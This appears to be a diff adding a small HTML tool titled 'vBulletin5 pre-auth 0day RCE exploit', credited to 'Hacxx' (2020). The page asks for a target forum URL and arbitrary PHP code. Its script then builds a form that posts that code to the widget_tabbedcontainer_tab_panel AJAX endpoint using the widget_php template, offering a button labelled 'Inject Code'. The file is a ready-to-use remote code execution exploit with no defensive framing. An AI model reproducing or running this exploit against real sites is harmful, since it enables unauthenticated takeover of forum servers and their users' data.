@@ -1,0 +1,42 @@
+<html>
+<title>vBulletin5 pre-auth 0day RCE exploit</title>
+<body bgColor=#5e717f><br>
+<table style="background: #bed5e2;" cellspacing=0 cellpadding=0 align=center>
+<tr>
+<td style="border-right: #d8d8d8 0.75pt solid; padding-right: 6pt; border-top: #d8d8d8 0.75pt solid; padding-left: 6pt; background: #567280; padding-bottom: 6pt; border-left: #d8d8d8 0.75pt solid; width: 317.5pt; padding-top: 6pt;">
+<p><b><span style="font-size: 10pt; color: #ff9900; font-family: verdana; mso-ansi-language: en">vBulletin5 pre-auth 0day RCE exploit</span></b></p>
+</td>
+</tr>
+<tr>
+<td style="padding-right: 6pt; padding-left: 6pt; padding-bottom: 6pt; padding-top: 6pt"><br>
+<center><table border=0 cellspacing=0 cellpadding=0><tr><td>
+</td></tr></table>
+<center>
+<table>
+<input type="hidden" id="uselessid" value="">
+<tr><td>vBulletin 5 Site :</td><td> <input type="text" id="site_id" style="width: 100%" placeholder="http://example.com"></td>
+<tr><td>PHP Code:</td><td> <input type="text" style='width: 100%' id="php_id" placeholder="phpinfo();"></td>
+<tr><td></td><td><input type="button" style="width: 100%" value="Generate Link" onclick="execute()"><br><br><div id="encodingresult"></div></td></tr>
+</table>
+<br>
+<br>
+</center>
+<script>
+execute = function() {
+var site_id=document.getElementById("site_id").value;
+if (site_id == "") {alert("Write a vBulletin site!"); return false;}
+var php_id=document.getElementById("php_id").value;
+if (php_id == "") {alert("Write a PHP code to execute!"); return false;}
+var encodeitem=decodeURIComponent(php_id);
+var encodetxt=encodeURIComponent(uselessid);
+document.getElementById("encodingresult").innerHTML="<form action='"+site_id+"/ajax/render/widget_tabbedcontainer_tab_panel' method='post' target='_blank'><input type='hidden' name='subWidgets[0][template]' value='widget_php'><input type='hidden' name='subWidgets[0][config][code]' value='"+php_id+"'><input type='submit' name='submit' style='width: 100%' value=' > Inject Code'></form>";
+
+}
+</script>
+<table style="background: #bed5e2; width: 317.5pt; border-collapse: collapse; mso-padding-alt: 6.0pt 6.0pt 6.0pt 6.0pt" cellspacing=0 cellpadding=0 width=690 align=center bgColor=#bed5e2 border=0>
+<tr><td style="border-right: #d8d8d8 0.75pt solid; padding-right: 6pt; border-top: #d8d8d8 0.75pt solid; padding-left: 6pt; background: #567280; padding-bottom: 6pt; border-left: #d8d8d8 0.75pt solid; width: 450pt; padding-top: 6pt; border-bottom: medium none">
+<center><p><b><span style="font-size: 10pt; color: #c2dceb; font-family: verdana; mso-ansi-language: EN">Copyright © 2020 Hacxx</span></center></b>
+</td>
+</TR>
+</table>
+</body></html>
